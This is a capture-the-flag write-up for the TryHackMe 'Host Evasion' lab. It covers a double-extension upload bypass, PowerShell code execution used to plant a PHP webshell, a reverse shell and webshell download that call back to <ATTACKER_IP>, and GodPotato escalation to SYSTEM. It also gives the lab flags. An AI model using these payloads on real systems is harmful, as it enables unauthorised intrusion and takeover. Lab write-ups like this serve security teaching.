# TryHackMe — Host Evasion (PowerShell Script Analyser)

**Platform:** TryHackMe  
**Difficulty:** Medium  
**OS:** Windows Server 2019  
**Tags:** File Upload Bypass, PHP WebShell, PowerShell RCE, SeImpersonatePrivilege, GodPotato

---

## Recon

### Nmap

```
PORT     STATE SERVICE
8080/tcp open  http
```

Server header: `Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28` — XAMPP stack on Windows.

### Gobuster

```
/index.php   (Status: 200)
/uploads     (Status: 301)
```

Found `/uploads` directory — uploaded files are saved on the server.

---

## Exploitation

### File Upload Bypass

The target application is a **PowerShell Script Analyser** — it accepts `.ps1` files, "analyses" them and returns Output.

Server-side filter blocks everything except `.ps1` extensions. Using **Burp Suite**, I intercepted the upload request and changed the filename:

```
filename="shell.php.ps1"
```

The server only checks the last extension (`.ps1`) — the file passed the filter.

### PowerShell RCE

Discovered that the analyser actually **executes** PowerShell code inside the uploaded file. Used `Set-Content` to write a PHP webshell into the web server root:

```powershell
$code = '<?php system($_GET["cmd"]); ?>'
Set-Content -Path "C:\xampp\htdocs\shell.php" -Value $code
```

Uploaded the script through the form — the analyser executed it. The webshell became accessible at:

```
http://<IP>:8080/shell.php?cmd=whoami
# Output: hostevasion\evader
```

### Reverse Shell

Wrote a PowerShell reverse shell to htdocs via the analyser:

```powershell
$code = '$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",443);...'
Set-Content -Path "C:\xampp\htdocs\rev.ps1" -Value $code
```

Triggered via webshell:

```
http://<IP>:8080/shell.php?cmd=powershell+-ExecutionPolicy+Bypass+-File+C:\xampp\htdocs\rev.ps1
```

Got a connection back on `rlwrap nc -nvlp 443`.

---

## Privilege Escalation

### Enumeration

```powershell
whoami /priv
```

```
SeImpersonatePrivilege    Enabled
```

`SeImpersonatePrivilege` is enabled — classic vector for Potato attacks.

**OS:** Windows Server 2019 — JuicyPotato does not work here.

### GodPotato

Served GodPotato from attacker machine:

```bash
python3 -m http.server 8000
```

Downloaded to target via webshell:

```
http://<IP>:8080/shell.php?cmd=powershell+-c+"Invoke-WebRequest+-Uri+'http://<ATTACKER_IP>:8000/GodPotato-NET4.exe'+-OutFile+'C:\xampp\htdocs\uploads\GodPotato.exe'"
```

Executed command as SYSTEM:

```
http://<IP>:8080/shell.php?cmd=C:\xampp\htdocs\uploads\GodPotato.exe+-cmd+"cmd+/c+type+C:\Users\Administrator\Desktop\flag.txt"
```

```
[*] CurrentUser: NT AUTHORITY\SYSTEM
THM{101011_ADMIN_ACCESS}
```

---

## Flags

| Flag | Value |
|------|-------|
| User | `THM{1010_EVASION_LOCAL_USER}` |
| Root | `THM{101011_ADMIN_ACCESS}` |

---

## Lessons Learned

1. **File upload filters** often check only the extension — double extension (`shell.php.ps1`) bypasses such validation
2. **Code analysers** can themselves be vulnerable if they execute the uploaded code
3. **`Set-Content`** in PowerShell allows writing files to arbitrary directories
4. **`SeImpersonatePrivilege`** on Windows Server 2019 — use GodPotato (not JuicyPotato)
5. For a stable reverse shell on Windows use `rlwrap nc`

---

## Tools Used

- Nmap
- Gobuster
- Burp Suite
- GodPotato
- Netcat / rlwrap
